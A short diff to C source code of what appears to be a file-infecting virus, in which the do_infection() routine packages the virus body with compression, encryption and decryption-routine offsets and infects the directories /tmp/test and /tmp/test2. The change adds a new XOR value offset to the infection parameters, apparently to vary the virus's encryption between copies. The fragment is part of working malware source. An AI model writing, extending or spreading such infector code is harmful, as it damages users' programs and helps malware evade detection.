@@ -38,6 +38,7 @@ extern char test_area;
 extern char   key[16];
 extern uint64_t seed;
 extern uint64_t fingerprint;
+extern unsigned int num_to_xor;
 
 //======================== WAR ===============================
 
@@ -105,7 +106,14 @@ void do_infection(){
 		modift_off = ((size_t)&modified_table) - ((size_t)&bin_start);
 		modiftlen_off = ((size_t)&modified_table_len) - ((size_t)&bin_start);
 
-		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off, gbt_off, gbtlen_off, modift_off, modiftlen_off};
+		size_t num_to_xor_off = ((size_t)&num_to_xor) - ((size_t)&bin_start);
+		
+		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len,
+			crypt_off, crypt_len, decrypt_routine_off,
+			&DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off,
+			gbt_off, gbtlen_off, modift_off, modiftlen_off,
+		num_to_xor_off};
+
 		infect_dir("/tmp/test", x, opt);
 		infect_dir("/tmp/test2", x, opt);
 }
